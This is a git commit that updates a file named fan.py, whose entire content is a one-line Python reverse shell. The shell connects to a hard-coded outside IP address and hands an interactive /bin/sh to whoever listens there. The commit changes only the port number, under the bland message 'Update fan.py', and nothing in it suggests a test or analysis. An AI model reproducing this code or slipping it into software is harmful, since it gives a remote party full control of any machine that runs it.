6f6367c149d2f91cbfffd467e654006885dfca63
noldorr <52195406+noldorr@users.noreply.github.com>
2019-07-12 15:27:19 +0800

    Update fan.py

--- fan.py
+++ fan.py
@@ -1,1 +1,1 @@
-import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("47.102.97.157",6655));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("47.102.97.157",7788));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
